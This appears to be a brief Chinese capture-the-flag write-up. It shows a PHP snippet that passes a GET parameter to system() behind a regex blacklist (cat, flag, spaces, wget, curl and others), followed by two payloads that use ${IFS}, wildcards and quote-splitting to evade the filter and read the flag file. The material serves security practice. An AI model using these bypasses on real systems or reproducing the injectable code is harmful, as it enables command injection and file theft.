# 知识点
# 思路
源码
```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```
payload
```php
方法一 ?c=nl${IFS}fla?.php
方法二 ?c=c''at${IFS}fla''g.p''hp
```
![image.png](./images/20231017_2350553278.png)
